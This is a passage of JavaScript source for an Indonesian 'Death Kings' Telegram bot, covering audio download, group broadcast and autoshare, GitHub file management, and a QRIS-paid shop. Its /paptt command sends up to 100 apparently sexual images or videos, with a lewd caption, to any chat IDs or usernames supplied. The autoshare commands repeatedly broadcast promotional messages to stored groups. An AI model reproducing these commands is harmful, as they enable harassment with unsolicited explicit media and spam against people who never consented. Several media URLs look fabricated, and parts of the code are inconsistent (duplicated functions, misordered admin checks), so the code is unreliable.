    let meta = null, chosen = null, lastErr = null;
    for (const c of candidates) {
      try { meta = await fetchMp3(c.url); chosen = c; break; } catch (e) { lastErr = e; }
    }
    if (!meta) return fail(ctx, "API gagal", lastErr);

    const file = path.join(os.tmpdir(), `ᴅᴇᴀᴛʜ ᴋɪɴɢs_${Date.now()}.mp3`);
    try { await download(meta.dlink, file); } catch (e) { return fail(ctx, "Download gagal", e); }

    await ctx.replyWithAudio({ source: file }, {
      caption: `🎶 ${meta.title || chosen.title}\n👤 ${meta.author || chosen.author}\n🔗 ${chosen.url || ""}\n\n© ᴅᴇᴀᴛʜ ᴋɪɴɢs 👑`,
      performer: meta.author || chosen.author || "YouTube",
      title: (meta.title || chosen.title || "Audio") + " ♪"
    });

    try { fs.unlinkSync(file); } catch {}

  } catch (e) {
    await fail(ctx, "Proses gagal", e);
  }
});

// ===== CMD CEK ID CH
bot.command("cekidch", async (ctx) => {
  try {
    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);
    if (!isChannelMember || !isGroupMember) {
      return ctx.reply(
        "❌ Anda harus join *channel & group* dulu sebelum memakai command",
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
              [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
            ]
          }
        }
      );
    }

    const args = ctx.message?.text?.split(" ").slice(1);
    if (!args || !args.length) {
      return ctx.reply("❌ Contoh penggunaan:\n/cekidch https://t.me/namachannel");
    }

    let username;
    try {
      const url = new URL(args[0]);
      if (url.hostname !== "t.me") throw new Error("Bukan link t.me");
      username = url.pathname.replace("/", "").trim();
      if (!username) throw new Error("Username kosong");
    } catch (err) {
      return ctx.reply(`❌ Link tidak valid.\nAlasan: ${err.message}`);
    }

    let info;
    try {
      info = await ctx.telegram.getChat(`@${username}`);
    } catch (err) {
      console.error("getChat error:", err);
      return ctx.reply(`❌ Gagal mengambil info channel.\nAlasan: ${err.message}`);
    }

    function escapeMarkdown(text) {
      if (!text) return "";
      return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
    }

    const result = `✅ Info Channel:
🆔 ID: \`${escapeMarkdown(info.id.toString())}\`
📛 Nama: ${escapeMarkdown(info.title)}
🔗 Username: @${escapeMarkdown(username)}`;

    return ctx.reply(result, { parse_mode: "MarkdownV2" });

  } catch (err) {
    console.error("Unexpected error cekidch:", err);
    return ctx.reply(`❌ Terjadi kesalahan tidak terduga.\nAlasan: ${err.message}`);
  }
});

// ===== CMD PAPTT
const paptt = [
  "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
  "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
  "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
  "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
  "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
  "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
  "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
  "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
  "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
  "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
  "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
  "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
  "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
  "https://telegra.ph/file/1a2b3c4d5e6f7g8h9i0j.mp4",
  "https://telegra.ph/file/112233445566778899aa.jpg",
  "https://telegra.ph/file/bbccddee112233445566.mp4",
  "https://telegra.ph/file/778899aabbccddeeff11.jpg",
  "https://telegra.ph/file/2233445566778899aabb.mp4",
  "https://telegra.ph/file/ccddeeff001122334455.jpg",
  "https://telegra.ph/file/66778899aabbccddeeff.mp4",
  "https://telegra.ph/file/99887766554433221100.jpg",
  "https://telegra.ph/file/ffeeddccbbaa99887766.mp4",
  "https://telegra.ph/file/44556677889900aabbcc.jpg",
  "https://telegra.ph/file/ddeeff11223344556677.mp4",
  "https://telegra.ph/file/8899aabbccddeeff0011.jpg",
  "https://telegra.ph/file/33445566778899aabbcc.mp4",
  "https://telegra.ph/file/5566778899aabbccdde0.jpg",
  "https://telegra.ph/file/1122aabbccddeeff3344.mp4",
  "https://telegra.ph/file/7788ccddee1122334455.jpg",
  "https://telegra.ph/file/99aabbccddeeff667788.mp4"
];

function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

const MAX_PAPTT = 100;

bot.command("paptt", async (ctx) => {
  try {
    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx).catch(() => ({ isChannelMember: true, isGroupMember: true }));
    if (!isChannelMember || !isGroupMember) {
      return ctx.reply(
        "❌ Anda harus join *channel & group* dulu sebelum memakai command",
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
              [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
            ]
          }
        }
      );
    }

    const args = ctx.message?.text?.split(" ").slice(1) || [];
    let count = 1;
    let targetIds = [ctx.chat.id];
    let textStartIndex = 0;
    let usingTargets = false;

    if (args.length >= 1) {
      if (/^\d+$/.test(args[0])) {
        count = Math.min(parseInt(args[0]), MAX_PAPTT);
        textStartIndex = 1;
      }

      if (args[textStartIndex] && /^([@]?[A-Za-z0-9_]+|[-]?\d+)(,([@]?[A-Za-z0-9_]+|[-]?\d+))*$/.test(args[textStartIndex])) {
        usingTargets = true;
        targetIds = args[textStartIndex]
          .split(",")
          .map(t => t.trim())
          .filter(Boolean)
          .map(t => (/^-?\d+$/.test(t) ? parseInt(t, 10) : t.startsWith("@") ? t : `@${t}`));
        textStartIndex++;
      }
    }

    if (usingTargets) {
      await ctx.reply(`⏳️ Mulai mengirim ${count} paptt ke ${targetIds.length} target...`);
    } else {
      await ctx.reply(`⏳️ Mulai mengirim ${count} paptt di chat ini...`);
    }

    for (const chatId of targetIds) {
      let success = 0;
      const tasks = [];

      for (let i = 0; i < count; i++) {
        const url = pickRandom(paptt);
        const isVideo = url.endsWith(".mp4");

        tasks.push(
          (async () => {
            try {
              if (isVideo) {
                await ctx.telegram.sendVideo(chatId, { url }, { caption: "Jangan coli ya bwang🙄" });
              } else {
                await ctx.telegram.sendPhoto(chatId, { url }, { caption: "Jangan coli ya bwang🙄" });
              }
              success++;
            } catch (e) {
              console.error(`❌ Gagal kirim ke ${chatId} iterasi ${i + 1}:`, e.message);
            }
          })()
        );

        await new Promise(r => setTimeout(r, 400));
      }

      await Promise.allSettled(tasks);

      if (usingTargets) {
        await ctx.reply(`✅ Selesai mengirim ${success}/${count} paptt ke ${chatId}`);
      }
    }

    if (!usingTargets) {
      await ctx.reply(`✅ Selesai mengirim ${count} paptt di chat ini.`);
    } else {
      await ctx.reply(`✅ Semua proses pengiriman selesai.`);
    }

  } catch (err) {
    console.error("Unexpected error /paptt:", err);
    try {
      await ctx.reply(`❌ Terjadi kesalahan.\nAlasan: ${err.message}`);
    } catch {}
  }
});

// === CMD SHAREMSG ===
bot.command("sharemsg", async ctx => {
  try {
    const replyMsg = ctx.message.reply_to_message;

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);
    if (!isChannelMember || !isGroupMember) {
      return ctx.reply("❌ Join channel & group dulu sebelum pakai command", {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
            [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
          ]
        }
      });
    }

    if (!replyMsg) return ctx.reply("🪧 Reply pesan yang ingin dibagikan/promosi");

    const entry = {
      user_id: ctx.from.id,
      username: ctx.from.username || ctx.from.first_name,
      date: new Date().toISOString()
    };

    if (replyMsg.text) {
      entry.type = "text";
      entry.content = replyMsg.text;
    } else if (replyMsg.photo) {
      entry.type = "photo";
      entry.file_id = replyMsg.photo[replyMsg.photo.length - 1].file_id;
      entry.caption = replyMsg.caption || "";
    } else if (replyMsg.video) {
      entry.type = "video";
      entry.file_id = replyMsg.video.file_id;
      entry.caption = replyMsg.caption || "";
    } else {
      entry.type = "other";
      entry.content = "Unsupported message type";
    }

    saveShare(entry);

    const groups = JSON.parse(fs.readFileSync(groupFile));
    let sukses = 0;
    let gagal = 0;

    for (const gid of groups) {
      try {
        await ctx.telegram.copyMessage(gid, ctx.chat.id, replyMsg.message_id);
        sukses++;
      } catch {
        gagal++;
      }
    }

    await ctx.reply(
      `☰ SHAREMSG DONE
━━━━━━━━━━━━━━━━━━━━━━
┣ Total Grup: ${groups.length}
┣ Sukses: ${sukses}
┣ Gagal: ${gagal}
━━━━━━━━━━━━━━━━━━━━━━`
    );
  } catch (err) {
    console.error("Error /sharemsg:", err);
    ctx.reply(`❌ Error: ${err.message}`);
  }
});

// === CMD AUTOSHARE ===
const shareFile = "./database/share.json";
function loadShares() {
  try {
    if (!fs.existsSync(shareFile)) return [];
    const raw = fs.readFileSync(shareFile, "utf8");
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.error("loadShares: gagal membaca/parsing share.json:", err);
    return [];
  }
}
function saveShare(entry) {
  const shares = loadShares();
  shares.push(entry);
  fs.writeFileSync(shareFile, JSON.stringify(shares, null, 2));
}

function parseTime(str) {
  if (!str) return 10 * 1000;
  const match = /^(\d+)(s|m|h)?$/i.exec(str);
  if (!match) return 10 * 1000;

  const value = parseInt(match[1]);
  const unit = match[2] ? match[2].toLowerCase() : "s";

  switch (unit) {
    case "h": return value * 60 * 60 * 1000;
    case "m": return value * 60 * 1000;
    default:  return value * 1000;
  }
}

const autoShareMessages = [];
let autoShareInterval = null;

// === CMD AUTOSHARE ===
bot.command("autoshare", async ctx => {
  try {
    const replyMsg = ctx.message.reply_to_message;

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);
    if (!isChannelMember || !isGroupMember) {
      return ctx.reply("❌ Join channel & group dulu sebelum pakai command", {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
            [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
          ]
        }
      });
    }

    if (!replyMsg) {
      return ctx.reply("🪧 Reply pesan yang ingin dibagikan. Bisa reply beberapa kali, lalu ketik /startshare <intervalDetik>");
    }

    autoShareMessages.push({
      chatId: ctx.chat.id,
      message: replyMsg
    });

    return ctx.reply("✅ Pesan berhasil ditambahkan ke daftar autoshare.");
  } catch (err) {
    console.error("Error /autoshare:", err);
    ctx.reply(`❌ Error: ${err.message}`);
  }
});

// === CMD STARTSHARE ===
bot.command("startshare", async ctx => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    const intervalSec = parseInt(args[0]);

    if (!intervalSec || intervalSec < 10) {
      return ctx.reply("⚠️ Gunakan: /startshare <intervalDetik> (minimal 10 detik)");
    }

    if (autoShareInterval) {
      clearInterval(autoShareInterval);
      autoShareInterval = null;
    }

    autoShareInterval = setInterval(async () => {
      for (const item of autoShareMessages) {
        try {
          const m = item.message;
          if (m.text) {
            await ctx.telegram.sendMessage(item.chatId, m.text);
          } else if (m.photo) {
            await ctx.telegram.sendPhoto(item.chatId, m.photo[m.photo.length - 1].file_id, { caption: m.caption || "" });
          } else if (m.video) {
            await ctx.telegram.sendVideo(item.chatId, m.video.file_id, { caption: m.caption || "" });
          }
        } catch (e) {
          console.error("Gagal kirim autoshare:", e.message);
        }
      }
    }, intervalSec * 1000);

    return ctx.reply(`▶️ Autoshare dimulai setiap ${intervalSec} detik.`);
  } catch (err) {
    console.error("Error /startshare:", err);
    ctx.reply(`❌ Error: ${err.message}`);
  }
});

// === CMD STOPSHARE ===
bot.command("stopshare", async ctx => {
  try {
    if (autoShareInterval) {
      clearInterval(autoShareInterval);
      autoShareInterval = null;
      return ctx.reply("⏹️ Autoshare dihentikan.");
    } else {
      return ctx.reply("⚠️ Autoshare belum aktif.");
    }
  } catch (err) {
    console.error("Error /stopshare:", err);
    ctx.reply(`❌ Error: ${err.message}`);
  }
});

// Escape untuk MarkdownV2 (termasuk backslash)
function escapeMdV2(s) {
  if (s === undefined || s === null) return "";
  return String(s).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

bot.command("listshare", async (ctx) => {
  try {
    const args = (ctx.message && ctx.message.text) ? ctx.message.text.split(" ").slice(1) : [];
    let count = parseInt(args[0], 10);
    if (isNaN(count) || count <= 0) count = 10;
    if (count > 100) count = 100; // batas wajar

    const shares = loadShares();
    if (!shares.length) return ctx.reply("ℹ️ Belum ada data share yang tersimpan.");

    const start = Math.max(0, shares.length - count);
    const slice = shares.slice(start);

    const chunks = [];
    for (let i = 0; i < slice.length; i++) {
      const idx = start + i + 1;
      const s = slice[i] || {};
      const username = escapeMdV2(s.username || s.user_id || "Unknown");
      const date = escapeMdV2(s.date ? new Date(s.date).toLocaleString() : "Unknown");
      const type = escapeMdV2(s.type || "unknown");

      let preview = "";
      try {
        if (s.type === "text" && s.content) preview = escapeMdV2(String(s.content).slice(0, 200));
        else if ((s.type === "photo" || s.type === "video") && s.caption) preview = escapeMdV2(String(s.caption).slice(0, 200));
        else if (s.file_id) preview = escapeMdV2(String(s.file_id).slice(0, 200));
      } catch (e) {
        preview = "";
      }

      let entry = `*${idx}.* 👤 ${username}\n📅 ${date}\n📝 ${type}\n`;
      if (preview) entry += `➡️ ${preview}\n`;
      entry += "\n";

      if (!chunks.length || (chunks[chunks.length - 1].length + entry.length) > 3500) {
        chunks.push(entry);
      } else {
        chunks[chunks.length - 1] += entry;
      }
    }

    for (const chunk of chunks) {
      const chunkPlain = chunk.replace(/\\([_*[\]()~`>#+\-=|{}.!\\])/g, "$1");
      try {
        await ctx.reply(chunk, { parse_mode: "MarkdownV2" });
      } catch (err) {
        console.error("listshare: kirim chunk MarkdownV2 gagal, fallback ke plain text:", err);
        try {
          await ctx.reply(chunkPlain);
        } catch (err2) {
          console.error("listshare: fallback plain text juga gagal:", err2);
        }
      }
    }

    try {
      await ctx.reply("🗑️ Gunakan `/delshare <nomor>` untuk hapus promosi", { parse_mode: "Markdown" });
    } catch (e) {
      await ctx.reply("🗑️ Gunakan /delshare <nomor> untuk hapus promosi");
    }

  } catch (err) {
    console.error("Unhandled error di /listshare:", err);
    try { await ctx.reply("❌ Terjadi kesalahan saat menampilkan daftar share."); } catch {}
  }
});

// === CMD DELSHARE (hapus per item) ===
bot.command("delshare", async ctx => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length === 0) {
      return ctx.reply("⚠️ Gunakan `/delshare <nomor>` sesuai yang ada di /listshare");
    }

    const index = parseInt(args[0]);
    if (isNaN(index)) return ctx.reply("❌ Nomor tidak valid.");

    let shares = loadShares();
    if (index < 1 || index > shares.length) {
      return ctx.reply("❌ Nomor tidak ada dalam daftar.");
    }

    const removed = shares.splice(index - 1, 1)[0];
    fs.writeFileSync(shareFile, JSON.stringify(shares, null, 2));

    return ctx.reply(
      `🗑️ Data share berhasil dihapus:\n\n👤 ${removed.username || removed.user_id}\n📝 ${removed.type}`
    );
  } catch (err) {
    console.error("Error /delshare:", err);
    ctx.reply(`❌ Error: ${err.message}`);
  }
});


function escapeMdV2(text) {
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
}

bot.command("open", async ctx => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.document) {
      return ctx.reply("⚠️ Reply file yang ingin dibuka dengan /open");
    }

    const doc = reply.document;
    const file = await ctx.telegram.getFile(doc.file_id);
    const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const res = await fetch(url);
    if (!res.ok) return ctx.reply("❌ Gagal download file dari Telegram.");

    const buffer = Buffer.from(await res.arrayBuffer());
    const filename = doc.file_name || "file.unknown";
    const ext = filename.split(".").pop().toLowerCase();

    const textExt = ["txt", "js", "json", "md", "html", "css", "py", "java", "c", "cpp", "ts"];

    if (ext === "zip") {
      const zip = new AdmZip(buffer);
      const entries = zip.getEntries();

      if (entries.length === 0) {
        return ctx.reply("📭 File zip kosong.");
      }

      await ctx.reply(`📦 Ekstrak isi ${filename} (${entries.length} file):`, { parse_mode: "Markdown" });

      for (const entry of entries) {
        if (entry.isDirectory) continue;
        const entryName = entry.entryName;
        const entryData = entry.getData();
        await ctx.replyWithDocument({ source: entryData, filename: entryName });
      }
    } else if (textExt.includes(ext)) {
      const content = buffer.toString("utf8");
      const chunkSize = 3500;
      for (let i = 0; i < content.length; i += chunkSize) {
        const chunk = content.slice(i, i + chunkSize);
        await ctx.reply(`\`\`\`\n${escapeMdV2(chunk)}\n\`\`\``, { parse_mode: "MarkdownV2" });
      }
    } else {
      await ctx.reply("📦 File non-teks terdeteksi, mengirim ulang file...");
      await ctx.replyWithDocument({ source: buffer, filename });
    }
  } catch (err) {
    console.error("/open error:", err);
    ctx.reply("❌ Terjadi error saat membuka file.");
  }
});

// === Helper JSON ===
function loadFile(file, def = {}) {
  if (!fs.existsSync(file)) return def;
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    return def;
  }
}
function saveFile(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper file sementara ===
function saveTempFile(content, ext = "txt") {
  const filePath = path.join(__dirname, `ai_output_${Date.now()}.${ext}`);
  fs.writeFileSync(filePath, content, "utf8");
  return filePath;
}
async function saveZip(files) {
  const zipPath = path.join(__dirname, `ai_output_${Date.now()}.zip`);
  const output = fs.createWriteStream(zipPath);
  const archive = archiver("zip");
  archive.pipe(output);

  for (const f of files) {
    archive.append(f.content, { name: f.name });
  }
  await archive.finalize();

  return new Promise(resolve => {
    output.on("close", () => resolve(zipPath));
  });
}

// Base GitHub API
const GITHUB_API = `https://api.github.com/repos/${config.GITHUB_OWNER}/${config.GITHUB_REPO}/contents`;

// --- Upload file ---
async function uploadFileToGitHub(fileName, contentBuffer, config) {
  const url = `${GITHUB_API}/${fileName}`;
  let sha = null;

  try {
    const res = await axios.get(`${url}?ref=${config.GITHUB_BRANCH}`, {
      headers: { "Authorization": `token ${config.GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" }
    });
    sha = res.data.sha;
  } catch {
    sha = null;
  }

  return axios.put(url, {
    message: `upload ${fileName}`,
    content: contentBuffer.toString("base64"),
    branch: config.GITHUB_BRANCH,
    sha
  }, {
    headers: { "Authorization": `token ${config.GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" }
  });
}

// --- Delete file ---
async function deleteFile(fileName, config) {
  const url = `${GITHUB_API}/${fileName}`;
  const res = await axios.get(`${url}?ref=${config.GITHUB_BRANCH}`, {
    headers: { "Authorization": `token ${config.GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" }
  });

  const sha = res.data.sha;

  return axios.delete(url, {
    headers: { "Authorization": `token ${config.GITHUB_TOKEN}`, "Accept": "application/vnd.github.v3+json" },
    data: { message: `delete ${fileName}`, branch: config.GITHUB_BRANCH, sha }
  });
}

// --- Middleware: hanya admin yang bisa pakai command ---
bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text && ctx.message.text.startsWith("/")) {
    if (!isAdmin(ctx)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai perintah ini.");
    }
  }
  return next();
});

// --- CMD: /addfile <namafile.ext> ---
bot.command("addfile", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const fileName = args.join(" ").trim();

  if (!fileName)
    return ctx.reply("⚠️ Gunakan format: /addfile <namafile.ext>");
  
  // Tambahkan .zip di regex
  if (!fileName.match(/\.(js|css|html|json|txt|zip)$/i)) {
    return ctx.reply("⚠️ Format file harus .js, .css, .html, .json, .txt, atau .zip");
  }

  let contentBuffer;

  try {
    if (ctx.message.reply_to_message) {
      if (ctx.message.reply_to_message.document) {
        const fileId = ctx.message.reply_to_message.document.file_id;
        const link = await ctx.telegram.getFileLink(fileId);
        const res = await axios.get(link.href, { responseType: "arraybuffer" });
        contentBuffer = Buffer.from(res.data);
      } else if (ctx.message.reply_to_message.text) {
        contentBuffer = Buffer.from(ctx.message.reply_to_message.text, "utf-8");
      }
    }

    if (!contentBuffer) {
      return ctx.reply("⚠️ Reply ke file (.js/.css/.html/.json/.txt/.zip) atau teks kode.");
    }

    await uploadFileToGitHub(fileName, contentBuffer, config);
    ctx.reply(`✅ File *${fileName}* berhasil diupload/update ke repo.`, { parse_mode: "Markdown" });

  } catch (err) {
    ctx.reply(`❌ Gagal upload file: ${err.response ? JSON.stringify(err.response.data) : err.message}`);
  }
});

// --- CMD: /deletefile <namafile.ext> ---
bot.command("delfile", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const fileName = args.join(" ").trim();

  if (!fileName) return ctx.reply("⚠️ Gunakan format: /deletefile <namafile.ext>");

  try {
    await deleteFile(fileName, config);
    ctx.reply(`🗑️ File *${fileName}* berhasil dihapus dari repo.`, { parse_mode: "Markdown" });
  } catch (err) {
    ctx.reply(`❌ Gagal hapus file: ${err.message}`);
  }
});

// --- CMD: /listfile ---
bot.command("listfile", async (ctx) => {
  const url = `${GITHUB_API}?ref=${config.GITHUB_BRANCH}`;

  try {
    const res = await axios.get(url, {
      headers: { Authorization: `token ${config.GITHUB_TOKEN}`, Accept: "application/vnd.github+json" }
    });

    const files = res.data.filter(f => f.type === "file").map(f => f.name);

    if (files.length === 0) return ctx.reply("📂 Tidak ada file di repo.");

    let text = "📋 Daftar file di repo:\n\n";
    files.forEach((f, i) => {
      text += `${i + 1}. ${f}\n`;
    });

    ctx.reply(text);
  } catch (err) {
    ctx.reply(`❌ Gagal ambil daftar file: ${err.response ? JSON.stringify(err.response.data) : err.message}`);
  }
});

// ================== HELPERS ==================
function loadLocalJSON(file) {
  if (!fs.existsSync(file)) return [];
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    return [];
  }
}
function saveLocalJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

async function getBarang() {
  try {
    const url = `https://api.github.com/repos/${settings.GITHUB_OWNER}/${settings.GITHUB_REPO}/contents/${settings.GITHUB_PATH}`;
    const res = await fetch(url, {
      headers: { "User-Agent": "bot-app" }
    });
    if (!res.ok) throw new Error(`GitHub fetch gagal: ${res.status}`);
    const data = await res.json();
    const decoded = Buffer.from(data.content, "base64").toString("utf8");
    const parsed = JSON.parse(decoded);
    saveLocalJSON(barangFile, parsed);
    return parsed;
  } catch (err) {
    console.error("getBarang error:", err.message);
    return loadLocalJSON(barangFile);
  }
}

async function saveBarang(arr) {
  saveLocalJSON(barangFile, arr);
  const url = `https://api.github.com/repos/${settings.GITHUB_OWNER}/${settings.GITHUB_REPO}/contents/${settings.GITHUB_PATH}`;
  let sha;
  try {
    const res = await fetch(url, { headers: { "User-Agent": "bot-app" } });
    if (res.ok) {
      const prev = await res.json();
      sha = prev.sha;
    }
  } catch {}
  const body = {
    message: "Update barang.json via bot",
    content: Buffer.from(JSON.stringify(arr, null, 2)).toString("base64"),
    sha
  };
  await fetch(url, {
    method: "PUT",
    headers: { "User-Agent": "bot-app" },
    body: JSON.stringify(body)
  });
}

async function downloadFromGitHubRaw(filename) {
  try {
    const url = `https://raw.githubusercontent.com/${settings.GITHUB_OWNER}/${settings.GITHUB_REPO}/main/${filename}`;
    const res = await fetch(url);
    if (!res.ok) throw new Error(`Fetch raw gagal: ${res.status}`);
    return await res.buffer();
  } catch (err) {
    console.error("downloadFromGitHubRaw error:", err.message);
    return null;
  }
}

function loadOrders() { return loadLocalJSON(orderFile); }
function saveOrders(data) { saveLocalJSON(orderFile, data); }

async function sendListProduk(ctx) {
  const barang = await getBarang();
  if (!barang.length) return ctx.reply("ℹ️ Belum ada produk.");
  let text = "📦 *Daftar Produk:*\n\n";
  barang.forEach((b, i) => {
    text += `${i + 1}. 🆔 ${b.id}\n📦 ${b.nama}\n💰 Rp${b.harga}\n\n`;
  });
  return ctx.reply(text, { parse_mode: "Markdown" });
}

// ==== CMD ADDPRODUK
bot.command("addproduk", async ctx => {
  try {
    if (ctx.from.id != ADMIN_ID) return ctx.reply("❌ Hanya admin.");
    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args.includes("|")) return ctx.reply("⚠️ /addproduk <nama> | <harga>");
    const [nama, harga] = args.split("|").map(s => s.trim());

    const barang = await getBarang();
    const exist = barang.find(b => b.nama.toLowerCase() === nama.toLowerCase());
    if (exist) exist.harga = harga;
    else barang.push({ id: Date.now().toString(), nama, harga });

    await saveBarang(barang);
    await ctx.reply(`✅ Produk disimpan: ${nama} - Rp${harga}`);
    return sendListProduk(ctx);
  } catch (err) {
    console.error("addproduk error:", err);
    return ctx.reply("❌ Gagal menambah produk.");
  }
});

bot.command("delproduk", async ctx => {
  try {
    if (ctx.from.id != ADMIN_ID) return ctx.reply("❌ Hanya admin.");
    const args = ctx.message.text.split(" ").slice(1);
    if (!args.length) return ctx.reply("⚠️ /delproduk <id>");
    const id = args[0];
    const barang = await getBarang();
    const idx = barang.findIndex(b => b.id === id);
    if (idx === -1) return ctx.reply("❌ Produk tidak ditemukan.");
    const removed = barang.splice(idx, 1)[0];
    await saveBarang(barang);
    await ctx.reply(`🗑️ Produk dihapus: ${removed.nama}`);
    return sendListProduk(ctx);
  } catch (err) {
    console.error("delproduk error:", err);
    return ctx.reply("❌ Gagal menghapus produk.");
  }
});

bot.command("listproduk", async ctx => {
  return sendListProduk(ctx);
});

// === CMD BUY (tampilkan produk) ===
bot.command("buy", async ctx => {
  try {
    const barang = await getBarang();
    if (!barang.length) {
      return ctx.reply("ℹ️ Belum ada produk tersedia.");
    }

    const keyboard = {
      inline_keyboard: barang.map(b => [
        { text: `${b.nama} - Rp${b.harga}`, callback_data: `buy_${b.id}` }
      ])
    };

    await ctx.reply("📜 *Pilih produk yang ingin dibeli:*", {
      parse_mode: "Markdown",
      reply_markup: keyboard
    });
  } catch (err) {
    console.error("buy error:", err);
    return ctx.reply("❌ Gagal memproses /buy.");
  }
});

// === HANDLE CALLBACK BUY & CANCEL ===
bot.on("callback_query", async ctx => {
  try {
    const data = ctx.callbackQuery.data;

    if (data.startsWith("buy_")) {
      const barangId = data.split("_")[1];
      const barang = (await getBarang()).find(b => b.id === barangId);
      if (!barang) return ctx.answerCbQuery("❌ Produk tidak ditemukan.");

      const orders = loadOrders();
      const orderId = Date.now().toString();
      const order = {
        id: orderId,
        user_id: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        product: barang.nama,
        harga: barang.harga,
        status: "pending",
        date: new Date().toISOString()
      };
      orders.push(order);
      saveOrders(orders);

      await ctx.replyWithPhoto(
        { url: QRIS_URL },
        {
          caption:
            `🛒 Pesanan *${barang.nama}* dibuat.\n💰 Rp${barang.harga}\n\n` +
            `📌 Scan QRIS / Transfer ke DANA.\n📤 Setelah transfer, kirim bukti transfer (foto/ss) di chat ini.`,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "❌ Batalkan pesanan", callback_data: `cancel_${orderId}` }]
            ]
          }
        }
      );

      await ctx.telegram.sendMessage(
        ADMIN_ID,
        `📥 Pesanan baru\n🆔 ${orderId}\n👤 ${order.username}\n📦 ${order.product}\n💰 Rp${order.harga}\n📅 ${new Date().toLocaleString()}\n\nMenunggu bukti transfer...`
      );

      return ctx.answerCbQuery("✅ Pesanan dibuat.");
    }

    if (data.startsWith("cancel_")) {
      const orderId = data.split("_")[1];
      const orders = loadOrders();
      const idx = orders.findIndex(o => o.id === orderId && o.user_id === ctx.from.id);

      if (idx === -1) {
        return ctx.answerCbQuery("❌ Tidak ada order pending untuk dibatalkan.");
      }

      const order = orders[idx];
      orders.splice(idx, 1);
      saveOrders(orders);

      await ctx.reply(
        `🛑 Pesanan *${order.product}* berhasil dibatalkan.`,
        { parse_mode: "Markdown" }
      );

      await ctx.telegram.sendMessage(
        ADMIN_ID,
        `⚠️ Order dibatalkan oleh user\n🆔 ${order.id}\n👤 ${order.username}\n📦 ${order.product}\n💰 Rp${order.harga}`
      );

      return ctx.answerCbQuery("❌ Order dibatalkan.");
    }
  } catch (err) {
    console.error("callback_query buy/cancel error:", err);
    return ctx.answerCbQuery("❌ Terjadi error.");
  }
});

// handle bukti tf (photo)
bot.on("photo", async ctx => {
  const user = ctx.from;
  const photo = ctx.message.photo.pop();
  const orders = loadOrders();
  const order = orders.find(o => o.user_id === user.id && o.status === "pending");
  if (!order) return ctx.reply("❌ Tidak ada pesanan pending.");

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Konfirmasi", callback_data: `confirm_${order.id}` },
        { text: "❌ Tolak", callback_data: `reject_${order.id}` }
      ]
    ]
  };

  await ctx.telegram.sendPhoto(
    ADMIN_ID,
    photo.file_id,
    {
      caption: `📥 Bukti Transfer\n🆔 ${order.id}\n👤 ${order.username}\n📦 ${order.product}\n💰 Rp${order.harga}\n📅 ${new Date().toLocaleString()}`,
      reply_markup: keyboard
    }
  );

  return ctx.reply("✅ Bukti transfer diteruskan ke admin.");
});

bot.on("callback_query", async ctx => {
  try {
    const data = ctx.callbackQuery.data;

    if (data.startsWith("confirm_") || data.startsWith("reject_")) {
      const orderId = data.split("_")[1];
      let orders = loadOrders();
      const idx = orders.findIndex(o => o.id === orderId);
      if (idx === -1) return ctx.answerCbQuery("❌ Order tidak ditemukan.");
      const order = orders[idx];

      if (data.startsWith("confirm_")) {
  const barangFile = order.file || `${order.product}.zip`;
  const buffer = await downloadFromGitHubRaw(barangFile);

  if (buffer) {
    await ctx.telegram.sendDocument(
      order.user_id,
      { source: buffer, filename: barangFile },
